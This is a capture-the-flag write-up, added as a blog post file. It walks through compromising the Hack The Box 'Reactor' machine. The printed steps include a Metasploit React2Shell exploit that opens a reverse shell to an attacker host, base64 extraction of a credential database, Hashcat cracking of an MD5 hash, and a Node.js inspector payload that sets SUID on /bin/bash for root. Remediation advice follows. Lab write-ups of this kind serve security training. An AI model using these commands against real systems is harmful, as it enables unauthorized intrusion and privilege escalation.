@@ -1,0 +1,445 @@
+export const frontmatter = {
+  title: "Hack The Box Reactor Machine Writeup",
+  slug: "hack-the-box-reactor-machine-writeup",
+  category: "HTB Machine",
+  tags: "Next.js, React2Shell, Node.js, V8 Inspector",
+  description:
+    "Complete walkthrough of the Hack The Box Reactor machine, covering unauthenticated Next.js React2Shell RCE, credential extraction from a SQLite database, MD5 password cracking, SSH lateral movement, and privilege escalation through an exposed Node.js V8 Inspector running as root.",
+  date: "2026-10-03",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box Reactor Writeup | React2Shell RCE, MD5 Credential Cracking & Node.js Debugger Privilege Escalation | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Reactor writeup demonstrating exploitation of CVE-2025-55182 (React2Shell) for initial access, extraction and cracking of MD5 credentials from a SQLite database, SSH access as engineer, and root access through an exposed Node.js V8 Inspector running with root privileges.",
+};
+
+## Introduction
+
+Reactor is a Linux-based machine that highlights the risks of running outdated web frameworks and leaving development debugging tools exposed in a production environment. The exploitation path requires a solid understanding of modern web application vulnerabilities, local enumeration, and process architecture. This writeup details the steps to compromise the machine, moving from a publicly accessible web application to full root access.
+
+## Overview
+
+The compromise begins by targeting a Next.js web application running on port 3000. The application is running version 15.0.3, which is vulnerable to CVE-2025-55182 (React2Shell). Exploiting this Server-Side Remote Code Execution vulnerability yields an initial shell.
+
+Post-exploitation enumeration reveals a local SQLite database containing MD5 password hashes. Cracking these hashes offline provides the password for the `engineer` user, allowing for lateral movement via SSH. Finally, privilege escalation is achieved by discovering a local Node.js process running as root with the V8 Inspector debugging interface enabled. By port-forwarding the debug port and interacting with it via the Chrome DevTools Protocol, arbitrary JavaScript is executed to set the SUID bit on `/bin/bash`, resulting in a root shell.
+
+## Attack Chain
+
+- **Initial Access:** Exploiting CVE-2025-55182 (React2Shell) on a Next.js web application.
+- **Credential Harvesting:** Locating a local SQLite database (`reactor.db`) and extracting MD5 user hashes.
+- **Offline Cracking:** Using Hashcat to crack the `engineer` user's hash.
+- **Lateral Movement:** Logging in as `engineer` via SSH using the cracked credentials.
+- **Local Enumeration:** Identifying an exposed Node.js debugger on internal port `9229`.
+- **Privilege Escalation:** Tunneling the debug port and executing arbitrary code via the V8 engine to obtain root privileges.
+
+## Setup
+
+Download the VPN configuration file from the webpage and connect using `sudo openvpn file.ovpn`.
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name.
+
+To check if everything is working fine, we can use:
+```
+ping 10.129.119.80
+```
+
+Output:
+```
+PING 10.129.119.80 (10.129.119.80) 56(84) bytes of data.
+64 bytes from 10.129.119.80: icmp_seq=1 ttl=63 time=421 ms
+64 bytes from 10.129.119.80: icmp_seq=2 ttl=63 time=326 ms
+64 bytes from 10.129.119.80: icmp_seq=3 ttl=63 time=321 ms
+64 bytes from 10.129.119.80: icmp_seq=4 ttl=63 time=464 ms
+^C
+--- 10.129.119.80 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 4005ms
+rtt min/avg/max/mdev = 321.309/389.471/463.610/56.309 ms
+```
+
+## Enumeration
+
+Perform a Nmap full port scan:
+```
+nmap -p- -T4 10.129.119.80
+```
+
+Output:
+```
+Nmap scan report for 10.129.119.80
+Host is up (0.34s latency).
+Not shown: 65279 closed tcp ports (conn-refused), 254 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  ppp
+```
+
+The scan results indicate that port 22 is running an SSH service, while the service running on port 3000 could not be identified.
+
+Scan the port `3000` of the target with `whatweb`:
+```
+whatweb http://10.129.119.80:3000
+```
+
+Output:
+```
+http://10.129.119.80:3000/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.119.80], Script, Title[ReactorWatch | Core Monitoring System], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js]
+```
+
+The output suggests that the website is running on Next.js.
+
+[Wappalyzer](https://www.wappalyzer.com/) identified the Next.js version as `15.0.3`. Whenever a specific version number is exposed, the next logical step is to cross-reference it against public vulnerability databases. A search for 'Next.js 15.0.3 exploit' immediately highlights a critical recent vulnerability: `CVE-2025-55182` (React2Shell). With directory enumeration yielding no obvious administrative panels, focusing on this CVE became the primary vector.
+
+## Foothold
+
+The root cause of **CVE-2025-55182** is that React Server Components rely on a custom Flight protocol to serialize and transmit component data between the server and client.
+
+React decodes incoming RSC payloads using a deserialization mechanism that reconstructs component definitions, references, and function calls.
+
+The vulnerability primarily arises because:
+- React trusts client-supplied RSC payloads
+- It performs insufficient type and object validation
+- It reconstructs objects in a way that enables arbitrary function invocation
+
+As a result, an attacker can craft malicious RSC payloads that reference internal React server functions, leading to arbitrary JavaScript execution on the server.
+
+Even if a web application does not explicitly use server functions, it may still be affected because the vulnerable code is included by default when React Server Components packages are installed.
+
+The exploitation process begins by identifying React Server Component routes. The attacker then sends a request containing a malicious RSC payload designed to instantiate server-side functions. React attempts to reconstruct this payload into a valid RSC message, and during deserialization it interprets `$f` values as function references.
+
+It then resolves object references without verifying the legitimacy of their source and passes the reconstructed data directly into the server’s execution context. This ultimately causes React to invoke a server function, resulting in server-side command execution rather than merely client-side JavaScript evaluation.
+
+While a custom Python script could be used to craft the React Server Component payload, we opted for the streamlined Metasploit module to gain the initial shell:
+
+```
+use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
+```
+
+View the available options:
+
+```
+show options
+```
+
+Configure the required parameters:
+
+```
+set RPORT 3000
+set LHOST 10.10.14.50
+set RHOSTS 10.129.119.80
+```
+
+Then launch the exploit:
+
+```
+run
+```
+
+Output:
+
+```
+[*] Started reverse TCP handler on 10.10.14.50:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] Command shell session 1 opened (10.10.14.50:4444 ->  10.129.119.80:43732) at 2026-05-24 18:58:02 +0530
+```
+
+Once the session is established, interact with it using:
+
+```
+sessions -i 1
+```
+
+With a command shell successfully obtained on the target system, the next step is to enumerate available files and identify any local data that could contain sensitive information or credentials for further privilege escalation or lateral movement.
+
+## Lateral Movement
+
+List the files in the current directory with:
+
+```
+ls
+```
+
+Output:
+
+```
+app
+next.config.js
+node_modules
+package.json
+package-lock.json
+reactor.db
+```
+
+The file `reactor.db` appears to be a database file that may contain stored credentials.
+
+Confirm the file type with:
+```
+file reactor.db
+```
+
+Output:
+```
+reactor.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 7, database pages 3, cookie 0x2, schema 4, UTF-8, version-valid-for 7
+```
+
+Because we are operating over a basic reverse shell, standard file transfer tools like `scp` or Python's HTTP server might not be available or stable. Furthermore, `reactor.db` is a binary SQLite file; printing it directly to the terminal would corrupt the data. To safely exfiltrate the database, we encode it into text format using:
+```
+base64 -w 400 reactor.db
+```
+
+Then, copy the output from the terminal and save it to a file:
+```
+cat <<EOF > base64_encode
+<base64_encoded_text>
+EOF
+```
+
+Finally, decode the file with:
+```
+base64 -d encoded_encode > reactor.db
+```
+
+Verify the MD5 hash on both ends with:
+
+```bash
+md5sum reactor.db
+```
+
+Ensure that the hashes match to confirm the file was transferred correctly.
+
+On the attacker machine, use `sqlite3` to interact with the database file:
+```
+sqlite3 reactor.db
+```
+
+Output:
+```
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite> 
+```
+
+View the database tables with:
+```
+.tables
+```
+
+Output:
+```
+sensor_logs  users
+```
+
+View the contents of the users `table` with:
+```
+SELECT * FROM users;
+```
+
+Output:
+```
+1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
+```
+
+The 32-character hashes suggest that they may be `MD5` hashes.
+
+Save the hashes with:
+```
+echo 'a203b22191d744a4e70ada5c101b17b8' > admin_hash
+echo '39d97110eafe2a9a68639812cd271e8e' > eng_hash
+```
+
+Use Hashcat in mode `0` (MD5) to crack the hashes:
+```
+hashcat -m 0 eng_hash rockyou.txt
+```
+
+After a successful crack, view the recovered password with:
+```
+hashcat -m 0 eng_hash rockyou.txt --show
+```
+
+Output:
+```
+39d97110eafe2a9a68639812cd271e8e:reactor1
+```
+
+> **Note:** Attempts to crack the `admin` hash were unsuccessful.
+
+Now that you have successfully cracked the password for the `engineer` user, connect to SSH with:
+
+```
+ssh engineer@10.129.119.80 
+```
+
+When prompted for the password, enter:
+
+```
+reactor1
+```
+
+Navigate to `/home/engineer` and view the user flag:
+
+```
+cd /home/engineer
+cat user.txt
+```
+
+Output:
+
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+## Privilege Escalation
+
+To view information about user and group memberships use:
+```
+id
+```
+
+Output:
+```
+uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
+```
+
+The `engineer` user is part of the interesting `lxd` group, which could be a potential vector for privilege escalation.
+
+Seeing the user in the `lxd` group is typically a guaranteed path to root via container manipulation. However, checking `systemctl status lxd` revealed the service was not even running, making this a rabbit hole. Forced to pivot, the next step was to hunt for hidden internal services that might be running with elevated privileges using:
+
+```
+ss -tulnp
+```
+
+Output:
+
+```
+Netid       State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port       Process       
+udp         UNCONN       0            0                     127.0.0.54:53                     0.0.0.0:*                        
+udp         UNCONN       0            0                  127.0.0.53%lo:53                     0.0.0.0:*                        
+udp         UNCONN       0            0                        0.0.0.0:68                     0.0.0.0:*                        
+tcp         LISTEN       0            511                    127.0.0.1:9229                   0.0.0.0:*  <-- [Target Debugger Port]                      
+tcp         LISTEN       0            4096                  127.0.0.54:53                     0.0.0.0:*                        
+tcp         LISTEN       0            4096               127.0.0.53%lo:53                     0.0.0.0:*                        
+tcp         LISTEN       0            4096                     0.0.0.0:22                     0.0.0.0:*                        
+tcp         LISTEN       0            4096                        [::]:22                        [::]:*                        
+tcp         LISTEN       0            511                            *:3000                         *:*   
+```
+
+The output reveals an interesting local port: `127.0.0.1:9229`.
+
+To access it, disconnect the current SSH session and use local port forwarding:
+
+```
+ssh -L 9229:127.0.0.1:9229 engineer@10.129.119.80
+```
+
+Since port `9229` appears to be in use locally, we can inspect the related process by running:
+
+```
+ps aux | grep 9229
+```
+
+Output:
+```
+root        1399  0.0  1.2 1066696 50268 ?       Ssl  09:27   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+engineer    2003  0.0  0.0   6544  2284 pts/0    S+   11:45   0:00 grep --color=auto 9229
+```
+
+The process output indicates that `worker.js` is running as **root**, and it was started with the `--inspect` flag. This enables the Node.js V8 Inspector, which is intended for debugging in development environments, not production.
+
+The inspector exposes a debugging interface that allows anyone who can connect to it to evaluate and execute arbitrary JavaScript code within the context of the running application.
+
+We inspected the source code of `/opt/uptime-monitor/worker.js` to see if there were any code-level vulnerabilities, such as command injection. The code is a simple loop that makes HTTP requests to a local service and safely writes the metrics to a CSV file.
+
+Because the code itself is secure, we must rely entirely on the environmental misconfiguration: the `--inspect` flag used to launch the process. Because the process is wrapped in the Node debugger, we can bypass the secure script entirely and feed arbitrary commands directly to the underlying Node.js engine running as root.
+
+Since Node.js is running on the V8 engine, a Chromium-based browser is required to access its debugging interface.
+
+The `--inspect` flag enables the V8 Inspector, which starts a debugging server that listens for Chrome DevTools Protocol (CDP) messages.
+
+CDP (Chrome DevTools Protocol) is the official interface used to inspect, debug, and profile Chromium-based browsers and the V8 JavaScript engine.
+
+To access it, open a Chromium-based browser and navigate to:
+
+```
+chrome://inspect
+```
+
+In the page, ensure that **"Discover network targets"** is enabled.
+
+Click **Configure** and add the target:
+
+```
+localhost:9229
+```
+
+Then click **Done**.
+
+Under **Remote Target**, the running script `/opt/uptime-monitor/worker.js` will appear.
+
+Click **Inspect** to open the DevTools window and access the console.
+
+In the console, run the following code:
+
+```
+const { exec } = require('child_process');
+
+exec('chmod u+s /bin/bash', (err, stdout, stderr) => {
+  if (err) {
+    console.error(err);
+    return;
+  }
+  console.log('SUID bit set successfully');
+});
+```
+
+After executing the payload, return to the SSH session and run:
+
+```
+/bin/bash -p
+```
+
+This will spawn a root shell:
+
+```
+bash-5.2#
+```
+
+Finally, retrieve the root flag:
+
+```
+cat /root/root.txt
+```
+
+Output:
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+## Remediation & Recommendations
+
+1. **Patch Web Frameworks (CVE-2025-55182):** The Next.js framework must be updated to a patched version immediately to prevent unauthenticated Remote Code Execution. Ensure that all dependencies, especially those handling React Server Components, are regularly audited and updated.
+2. **Secure Credential Storage:** The SQLite database stores user passwords using MD5, which is a weak and deprecated hashing algorithm. Passwords should be hashed using modern, computationally expensive algorithms such as Argon2, bcrypt, or scrypt. Additionally, enforce strict password complexity requirements to prevent offline dictionary attacks (e.g., `reactor1` is highly insecure).
+3. **Disable Debugging Interfaces in Production:** The `/opt/uptime-monitor/worker.js` script was launched with the `--inspect` flag. Debugging interfaces must never be enabled in production environments, as they bypass application logic and allow for arbitrary code execution. Remove the `--inspect` flag from the startup script or service file.
+4. **Principle of Least Privilege:** The Node.js worker script was running as the `root` user. Applications and background services should always execute under a dedicated service account with the minimum permissions required to function. If the Node process had been running as a low-privileged user, the exposed debugger would not have led to full system compromise.
+
+## MITRE ATT&CK Mapping
+
+1. **Initial Access**
+- T1190 - Exploit Public-Facing Application: Exploiting the Next.js React Server Components vulnerability (CVE-2025-55182).
+
+2. **Execution**
+- T1059.007 - Command and Scripting Interpreter: JavaScript: Using the React2Shell payload and the Node.js V8 Inspector to execute arbitrary JavaScript.
+
+3. **Credential Access**
+- T1555 - Credentials from Password Stores: Extracting the reactor.db SQLite database to dump user credentials.
+- T1110.002 - Brute Force: Password Cracking: Using Hashcat to crack the extracted MD5 hash offline.
+
+4. **Lateral Movement**
+- T1021.004 - Remote Services: SSH: Utilizing the cracked password to authenticate as the `engineer` user over SSH.
+
+5. **Privilege Escalation**
+- T1068 - Exploitation for Privilege Escalation: Abusing the misconfigured Node.js --inspect port running as root.
+- T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid: Setting the SUID bit on /bin/bash to spawn a privileged shell.
